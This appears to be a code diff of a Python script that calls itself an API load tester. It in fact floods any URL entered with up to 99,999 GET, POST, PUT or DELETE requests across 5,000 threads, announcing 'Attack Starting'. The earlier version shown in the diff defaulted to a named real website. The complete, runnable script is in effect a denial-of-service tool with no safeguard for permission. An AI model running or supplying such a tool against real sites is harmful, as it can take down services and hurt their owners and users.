@@ -4,23 +4,41 @@ import time
 from queue import Queue
 import random
 import json
+import os
+
+# Terminal UI Styling
+def banner():
+    os.system('clear' if os.name == 'posix' else 'cls')
+    print("\033[1;32m")
+    print("════════════════════════════════════════════════════════════")
+    print("   🚀 HIGH-TRAFFIC API TESTER / LOAD TOOL  ")
+    print("════════════════════════════════════════════════════════════")
+    print(" ⚔️  Author: Badhon-696 | R3D-X Pentest Lab")
+    print(" 🔐  Purpose: API Stress Testing / Load Simulation")
+    print("════════════════════════════════════════════════════════════")
+    print("\033[0m")
+
+banner()
 
 # URL Input System
-url = input("Target URL: ").strip()
+url = input("🔗 Enter Target URL: ").strip()
 if not url:
-    url = "https://smboostzone.com/"
+    print("\033[91m[✘] Target URL required! Exiting...\033[0m")
+    exit()
 
-# Configuration
-num_threads = 5000               # Running Thread's'
-request_limit = 99999            # Total Thread's'
-timeout = 5                      # Response Time
-http_method = input("Select method EX..GET, PUT, POST, DELETE: ").strip()             # HTTP (GET, POST, PUT, DELETE)
+# Config Inputs
+print("\n🔧 Configuration:")
+num_threads = 5000
+request_limit = 99999
+timeout = 5
+http_method = input("📡 Select HTTP Method [GET / POST / PUT / DELETE]: ").strip().upper()
+
 headers = {
     "Content-Type": "application/json",
     "Authorization": "Bearer YOUR_TOKEN"
 }
 
-# Dynamic Payload Generator
+# Payload Generator
 def generate_payload():
     return {
         "user_id": random.randint(1, 1000),
@@ -36,6 +54,7 @@ failed_requests = 0
 total_time = 0
 metrics_lock = threading.Lock()
 
+# Send Function
 def send_request():
     global successful_requests, failed_requests, total_time
     while not request_queue.empty():
@@ -44,6 +63,7 @@ def send_request():
 
             if http_method == "GET":
                 response = requests.get(url, headers=headers, timeout=timeout)
+                payload = None
             elif http_method == "POST":
                 payload = generate_payload()
                 response = requests.post(url, headers=headers, json=payload, timeout=timeout)
@@ -52,8 +72,9 @@ def send_request():
                 response = requests.put(url, headers=headers, json=payload, timeout=timeout)
             elif http_method == "DELETE":
                 response = requests.delete(url, headers=headers, timeout=timeout)
+                payload = None
             else:
-                print(f"Unsupported HTTP method: {http_method}")
+                print(f"\033[91m[✘] Unsupported HTTP method: {http_method}\033[0m")
                 return
 
             elapsed_time = time.time() - start_time
@@ -61,19 +82,23 @@ def send_request():
                 successful_requests += 1
                 total_time += elapsed_time
 
-            print(f"Status Code: {response.status_code}, Time: {elapsed_time:.2f}s, Payload: {json.dumps(payload, indent=2) if http_method in ['POST', 'PUT'] else 'N/A'}")
+            print(f"\033[92m[✓] {http_method} {url} | Code: {response.status_code} | Time: {elapsed_time:.2f}s\033[0m")
 
         except requests.exceptions.RequestException as e:
             with metrics_lock:
                 failed_requests += 1
-            print(f"Request failed: {e}")
+            print(f"\033[91m[✘] Request Failed: {e}\033[0m")
 
+# Request Generator
 def generate_requests():
     for _ in range(request_limit):
         request_queue.put(1)
 
+# Main Executor
 def run_load_test():
-    print(f"\n🔫 Attack Starting on: {url}\n")
+    print(f"\n🎯 Target: {url}")
+    print(f"🧵 Threads: {num_threads} | 🎯 Requests: {request_limit} | ⏱ Timeout: {timeout}s\n")
+    print("🚀 Attack Starting...\n")
     start_time = time.time()
 
     generate_requests()
@@ -90,13 +115,18 @@ def run_load_test():
     end_time = time.time()
     total_elapsed_time = end_time - start_time
 
-    print("\n✅ Attack Completed!")
-    print(f"Total Requests: {request_limit}")
-    print(f"Successful Requests: {successful_requests}")
-    print(f"Failed Requests: {failed_requests}")
+    # Report Summary
+    print("\n══════════════════════════════")
+    print("✅  ATTACK COMPLETED")
+    print("══════════════════════════════")
+    print(f"🔁 Total Requests Sent  : {request_limit}")
+    print(f"✅ Successful Requests  : {successful_requests}")
+    print(f"❌ Failed Requests      : {failed_requests}")
     if successful_requests > 0:
-        print(f"Average Response Time: {total_time / successful_requests:.2f} seconds")
-    print(f"Total Time Taken: {total_elapsed_time:.2f} seconds")
+        print(f"📊 Avg Response Time    : {total_time / successful_requests:.2f} sec")
+    print(f"⏳ Total Test Duration  : {total_elapsed_time:.2f} sec")
+    print("══════════════════════════════\n")
 
+# Execute
 if __name__ == "__main__":
     run_load_test()
